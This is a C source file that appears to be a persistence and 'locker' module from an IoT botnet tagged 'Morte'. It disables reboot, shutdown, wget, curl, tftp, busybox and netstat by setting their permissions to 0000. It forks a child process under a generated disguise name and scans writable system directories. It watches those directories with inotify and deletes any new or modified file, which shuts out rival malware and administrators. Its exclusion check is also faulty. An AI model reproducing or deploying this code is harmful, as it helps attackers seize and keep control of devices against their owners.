#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/inotify.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/stat.h>

#include "headers/daemon.h"
#include "headers/locker.h"

#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUF_LEN (1024 * (EVENT_SIZE + 16))

char *initial_paths[] = {
    "/data/local/tmp",
    "/tmp",
    "/var",
    "/mnt",
    "/root",
    "/boot",
    "/bin",
    "/sbin",
    "/home",
    "/dev"
};

const char *blacklisted_commands[] = {
    "/sbin/reboot",       "/usr/sbin/reboot",  "/bin/reboot",
    "/usr/bin/reboot",    "/sbin/shutdown",    "/usr/sbin/shutdown",
    "/bin/shutdown",      "/usr/bin/shutdown", "/sbin/poweroff",
    "/usr/sbin/poweroff", "/bin/poweroff",     "/usr/bin/poweroff",
    "/sbin/halt",         "/usr/sbin/halt",    "/bin/halt",
    "/usr/bin/halt",      "/sbin/wget",        "/usr/sbin/wget",
    "/bin/wget",          "/usr/bin/wget",     "/sbin/curl",
    "/usr/sbin/curl",     "/bin/curl",         "/usr/bin/curl",
    "/sbin/ftpget",       "/usr/sbin/ftpget",  "/bin/ftpget",
    "/usr/bin/ftpget",    "/sbin/tftp",        "/usr/sbin/tftp",
    "/bin/tftp",          "/usr/bin/tftp",     "/sbin/busybox",
    "/usr/sbin/busybox",  "/bin/busybox",      "/usr/bin/busybox",
    "/sbin/netstat",      "/usr/sbin/netstat", "/bin/netstat",
    "/usr/bin/netstat"
};

char *blacklisted[] = {
    "/dev/null",
    "/dev/console",
    "/var/lib/docker"
};

struct watcher {
    char *path;
    int wd;
};

// paths found
char **paths = NULL;
int num_paths = 0;

struct watcher **watchers = NULL;
int num_watchers = 0;

int watcher_len;
int fd;
int watcher_pid = 0;

char buffer[EVENT_BUF_LEN];

void disable_commands(void) {
    int num_blacklisted_commands = sizeof(blacklisted_commands) / sizeof(blacklisted_commands[0]);

    for (int i = 0; i < num_blacklisted_commands; i++) {
        if (chmod(blacklisted_commands[i], 0000) == -1) {
#ifdef DEBUG
            perror("[Morte_command] chmod failed");
#endif
        }
    }

#ifdef DEBUG
    printf("[Morte_command] Permissions on blacklisted commands set to 0000.\n");
#endif
}

char *my_strdup(const char *src) {
    size_t len = strlen(src) + 1;
    char *dup = malloc(len);
    if (dup != NULL) {
        memcpy(dup, src, len);
    }
    return dup;
}

void free_paths() {
    for (int i = 0; i < num_paths; ++i)
        free(paths[i]);

    free(paths);
    paths = NULL;
}

void free_watchers() {
    for (int i = 0; i < num_watchers; i++) {
        inotify_rm_watch(fd, watchers[i]->wd);
        free(watchers[i]->path);
    }

    free(watchers);
}

void find_writable_dirs_recursive(const char *dir) {
    DIR *dp = opendir(dir);
    if (!dp) return;

    if (access(dir, W_OK) == 0) {
        char **temp = realloc(paths, (num_paths + 1) * sizeof(char *));
        if (temp != NULL) {
            paths = temp;
            paths[num_paths] = my_strdup(dir);
            if (paths[num_paths] == NULL) {
                free_paths();
                return;
            } else {
                num_paths++;
            }
        } else {
            free_paths();
            return;
        }
    }

    struct dirent *entry;
    while ((entry = readdir(dp))) {
        if (entry->d_name[0] != '.' && entry->d_type == 4) {
            char p[1024];
            snprintf(p, sizeof(p), "%s/%s", dir, entry->d_name);
            find_writable_dirs_recursive(p);
        }
    }

    closedir(dp);
}

void find_writable_dirs_initial() {
    for (int i = 0; i < sizeof(initial_paths) / sizeof(initial_paths[0]); i++) {
        find_writable_dirs_recursive(initial_paths[i]);
    }
}

void initialize_inotify() {
    fd = inotify_init();
    if (fd < 0)
        return;
}

void add_watcher(const char *path) {
    struct watcher *watch = malloc(sizeof(struct watcher));

    watch->path = my_strdup(path);
    if (watch->path == NULL)
        return;

    watch->wd = inotify_add_watch(fd, watch->path, IN_CREATE | IN_MODIFY);
    if (watch->wd == -1)
        return;

    #ifdef DEBUG
    printf("[watcher] added [%s] to watch list\n", watch->path);
    #endif

    watchers = realloc(watchers, (num_watchers + 1) * sizeof(struct watcher *));
    if (watchers == NULL) return;

    watchers[num_watchers] = watch;
    num_watchers++;
}

void handle_inotify_event(struct inotify_event *event) {
    for (int j = 0; j < num_paths; j++) {
        if (event->wd != watchers[j]->wd) continue;
        if (event->mask & IN_ISDIR) continue;

        char name[FILENAME_MAX] = "";
        strcpy(name, watchers[j]->path);
        strcat(name, "/");
        strcat(name, event->name);

        int h;
        for (h = 0; h < sizeof(blacklisted) / sizeof(blacklisted[0]); ++h) {
            if (strcmp(name, blacklisted[h]) == 0) continue;
        }

        if (remove(name) == -1)
            break;

        #ifdef DEBUG
        printf("[watcher] deleted file [%s]\n", name);
        #endif
        
        break;
    }
}

void handle_inotify_events() {
    while (1) {
        watcher_len = read(fd, buffer, EVENT_BUF_LEN);
        if (watcher_len < 0)
            return;

        int i = 0;

        while (i < watcher_len) {
            struct inotify_event *event = (struct inotify_event *) &buffer[i];
            handle_inotify_event(event);
            i += EVENT_SIZE + event->len;
        }
    }
}

int watcher_destroy() {
    free_watchers();
    close(fd);

    return 0;
}

void watcher_init() {
    watcher_pid = fork();
    if (watcher_pid > 0 || watcher_pid == -1)
        return;

    char locker_name[32];
    gen_name(locker_name, sizeof(locker_name));
    set_name(locker_name);

    find_writable_dirs_initial();
    initialize_inotify();

    for (int i = 0; i < num_paths; ++i) {
        add_watcher(paths[i]);
    }

    #ifdef DEBUG
    printf("[watcher] watching [%d] directories using inotify\n", num_paths);
    #endif

    handle_inotify_events();
}
